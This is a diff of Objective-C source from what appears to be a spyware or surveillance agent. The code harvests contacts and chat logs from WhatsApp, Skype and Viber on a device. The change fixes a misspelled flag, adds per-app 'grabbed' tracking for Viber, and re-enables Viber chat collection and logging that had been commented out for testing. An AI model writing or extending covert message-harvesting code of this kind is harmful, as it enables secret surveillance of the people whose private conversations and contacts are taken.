@@ -54,8 +54,9 @@
 #define VIBER_STATE_POS   2
 #define VIBER_PHONE_POS   3
 
-static BOOL gWahtAppContactGrabbed = NO;
+static BOOL gWhatsAppContactGrabbed = NO;
 static BOOL gSkypeContactGrabbed = NO;
+static BOOL gViberContactGrabbed = NO;
 
 #pragma mark -
 #pragma mark skXmlShared
@@ -248,13 +249,13 @@ foundCharacters:(NSString *)string
 
 - (void)logChatContacts:(NSString*)contact appName:(NSString*)appName flag:(NSInteger)flags
 {
-  if (flags == WHATS_APP_FLAG && gWahtAppContactGrabbed == TRUE)
+  if (flags == WHATS_APP_FLAG && (gWhatsAppContactGrabbed == TRUE || mWAUsername == @""))
     return;
   
-  if (flags == SKYPE_APP_FLAG && gSkypeContactGrabbed == TRUE)
+  if (flags == SKYPE_APP_FLAG && (gSkypeContactGrabbed == TRUE || mSkUsername == @""))
     return;
   
-  if (mWAUsername == @"" || gWahtAppContactGrabbed == YES)
+  if (flags == VIBER_APP_FLAG && (gViberContactGrabbed == TRUE || mVbUsername == @""))
     return;
   
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
@@ -344,10 +345,13 @@ foundCharacters:(NSString *)string
   [pool release];
   
   if (flags == WHATS_APP_FLAG)
-    gWahtAppContactGrabbed = TRUE;
+    gWhatsAppContactGrabbed = TRUE;
   
   if (flags == SKYPE_APP_FLAG)
     gSkypeContactGrabbed = TRUE;
+  
+  if (flags == VIBER_APP_FLAG)
+    gViberContactGrabbed = TRUE;
 }
 
 #pragma mark -
@@ -1534,8 +1538,7 @@ foundCharacters:(NSString *)string
   NSMutableArray *waChats = nil;
   NSMutableArray *skChats = nil;
   
-  // temporary disabled for testing
-  //NSMutableArray *vbChats = nil;
+  NSMutableArray *vbChats = nil;
   
   if ([self isThreadCancelled] == TRUE)
   {
@@ -1548,15 +1551,13 @@ foundCharacters:(NSString *)string
   
   waChats = [self getWAChats];
 
-  // temporary disabled for testing
-  //vbChats = [self getVbChats];
+  vbChats = [self getVbChats];
   
   [self writeChatLogs:waChats];
 
   [self writeChatLogs:skChats];
 
-  // temporary disabled for testing
-  //[self writeChatLogs:vbChats];
+  [self writeChatLogs:vbChats];
   
   [pool release];
 }
@@ -1592,11 +1593,17 @@ foundCharacters:(NSString *)string
     return;
   }
   
-  [self logChatContacts:mWAUsername appName:@"WhatsApp" flag:WHATS_APP_FLAG];
+  [self logChatContacts:mWAUsername
+                appName:@"WhatsApp"
+                   flag:WHATS_APP_FLAG];
   
-  [self logChatContacts:mSkUsername appName:@"Skype" flag:SKYPE_APP_FLAG];
+  [self logChatContacts:mSkUsername
+                appName:@"Skype"
+                   flag:SKYPE_APP_FLAG];
   
-  [self logChatContacts:mVbUsername appName:@"Viber" flag:VIBER_APP_FLAG];
+  [self logChatContacts:mVbUsername
+                appName:@"Viber"
+                   flag:VIBER_APP_FLAG];
   
   [self getProperties];
   
